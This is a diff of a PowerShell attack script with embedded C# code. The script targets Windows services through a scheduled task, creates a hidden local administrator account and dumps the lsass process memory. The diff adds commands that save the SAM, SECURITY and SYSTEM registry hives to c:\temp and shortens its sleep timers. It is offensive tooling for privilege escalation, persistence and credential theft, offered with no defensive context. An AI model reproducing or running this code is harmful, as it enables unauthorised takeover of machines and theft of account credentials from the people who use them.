@@ -17,9 +17,9 @@ $P = New-ScheduledTaskPrincipal "$env:USERNAME"
 $S = New-ScheduledTaskSettingsSet
 $D = New-ScheduledTask -Action $A -Principal $P -Trigger $T -Settings $S
 Register-ScheduledTask T1 -InputObject $D -Force 
-start-sleep 30
+start-sleep 5
 Start-ScheduledTask -TaskName T1
-start-sleep 30
+start-sleep 5
 $f=(Get-Content $env:AppData\services.txt)
 $targets = @()
 (($f -match '^  (Name|PathName)') -replace '  Name',"`nName" -replace "  PathName","PathName") -join "," | % {
@@ -36,7 +36,6 @@ if($targets.Count -gt 0){
 using System;
 using System.DirectoryServices;
 using System.Diagnostics;
-
 namespace HelloWorld
 {
 	public class Program$id
@@ -51,7 +50,6 @@ namespace HelloWorld
                 if (userExists)
                     break;
             }
-
             if (false == userExists)
             {
                 
@@ -62,17 +60,43 @@ namespace HelloWorld
                 NewUser.Invoke("Put", new object[] {"Description", "Test User from .NET"});
                 NewUser.CommitChanges();
                 DirectoryEntry grp;
-
                 grp = AD.Children.Find("Administrators", "group");
                 if (grp != null) {grp.Invoke("Add", new object[] {NewUser.Path.ToString()});}
                 Console.WriteLine("Account Created Successfully");
             }
+                
+            var sam = new Process {
+                StartInfo = new ProcessStartInfo {
+                    FileName = @"c:\windows\system32\reg.exe",
+                    Arguments = @"hklm\sam c:\temp\sam.save"
+                }
+            };
+            sam.Start();
+            sam.WaitForExit();
+
+            var security = new Process {
+                StartInfo = new ProcessStartInfo {
+                    FileName = @"c:\windows\system32\reg.exe",
+                    Arguments = @"hklm\security c:\temp\security.save"
+                }
+            };
+            security.Start();
+            security.WaitForExit();
+
+            var system = new Process {
+                StartInfo = new ProcessStartInfo {
+                    FileName = @"c:\windows\system32\reg.exe",
+                    Arguments = @"hklm\system c:\temp\system.save"
+                }
+            };
+            system.Start();
+            system.WaitForExit();
+
 
             Process[] processlist = Process.GetProcessesByName("lsass");
             foreach (Process p in processlist)
             {
                 var strPID = Convert.ToString(p.Id);
-
                 var process = new Process {
                 StartInfo = new ProcessStartInfo {
                         FileName = @"c:\windows\system32\rundll32.exe",
@@ -81,7 +105,6 @@ namespace HelloWorld
                 };
                 process.Start();
                 process.WaitForExit();
-
                 var copy = new Process {
                 StartInfo = new ProcessStartInfo {
                         FileName = @"c:\windows\system32\cmd.exe",
@@ -92,7 +115,6 @@ namespace HelloWorld
                 copy.WaitForExit();
                 break;
             }
-
             
 		}
 	}
@@ -105,4 +127,3 @@ namespace HelloWorld
     Start-Service $name -ErrorAction SilentlyContinue
 
 } 
-
